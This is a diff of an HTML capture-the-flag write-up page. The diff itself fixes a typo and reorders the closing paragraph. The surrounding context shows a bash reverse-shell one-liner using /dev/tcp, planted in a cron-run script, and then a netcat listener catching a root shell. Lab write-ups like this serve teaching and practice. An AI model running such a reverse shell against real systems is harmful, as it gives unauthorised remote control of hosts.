@@ -233,7 +233,7 @@ echo $tmp_files
 <p>This should make it apparant that there&rsquo;s something (we can assume it is a cron) running this script every 5 minutes. That makes the wait time between changes a bit painful but we have confirmed we can execute code. As I don&rsquo;t trust 99% of rooms to contain a copy of <code>nc</code> that includes the <code>-e</code> executable flag, I decided to try a BASH specific method to get a shell, as we&rsquo;re modifying a bash script. This is a method listed under the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Pentest Monkey CheatSheet</a>
 :</p>
 <p><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
-<p>Replacing this with my relevant IP and a port with an active listener, I waited unti I finally got a connection:</p>
+<p>Replacing this with my relevant IP and a port with an active listener, I waited until I finally got a connection:</p>
 <pre><code>$ nc -nlvp 9001
 bash: cannot set terminal process group (1451): Inappropriate ioctl for device
 bash: no job control in this shell
@@ -254,8 +254,8 @@ uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone
 </blockquote>
 <hr>
 <h2 id="final-thoughts">Final Thoughts<a href="#final-thoughts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>This is a nice little OSCP-like box in terms of the things you have to check, and the room name provides the clue that we get initial access through anonymous logins. It was rated medium - many of the concepts used are basic so I wouldn&rsquo;t personally say it&rsquo;s that hard. It&rsquo;s more about observation and ensuring that you&rsquo;re not digging yourself a grave by, for example, re-uploading a modified file with incorrect permissions.</p>
 <p>TL;DR - keep it simple and be careful and this room shouldn&rsquo;t give you too much trouble.</p>
+<p>This is a nice little OSCP-like box in terms of the things you have to check, and the room name provides the clue that we get initial access through anonymous logins. It was rated medium - many of the concepts used are basic so I wouldn&rsquo;t personally say it&rsquo;s that hard. It&rsquo;s more about observation and ensuring that you&rsquo;re not digging yourself a grave by, for example, re-uploading a modified file with incorrect permissions.</p>
 
       </div></div>
   
